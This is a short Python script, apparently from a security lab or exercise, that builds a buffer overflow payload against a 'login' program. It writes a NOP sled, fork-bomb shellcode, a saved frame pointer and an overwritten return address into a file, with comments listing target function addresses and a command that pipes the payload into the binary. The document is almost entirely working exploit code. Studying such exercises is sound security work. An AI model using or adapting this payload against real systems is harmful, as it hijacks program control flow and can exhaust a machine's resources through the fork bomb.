#!/usr/bin/env python3

# Fork bomb:
#   0:	b8 02 00 00 00       	mov    $0x2,%eax
#   5:	cd 80                	int    $0x80
#   7:	eb f7                	jmp    0 <_start>

bytes = [
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, # buffer [ 0- 7]
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, # buffer [ 8-15]
0xb8, 0x02, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xeb, # buffer [16-23]
0xf7, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, # buffer [24-31]
0x80, 0xe4, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00, # ebp
0xc0, 0xe3, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00  # <- rip !!
]

# login_ok() = 0x95, 0x51, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00

# call_login_ok() = 0x82, 0x52, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00

# stack = 0x7fffffffe3d0

# run with
# cat input7.txt - | ./login

with open('payload.txt','wb') as file:
	file.write(bytearray(bytes))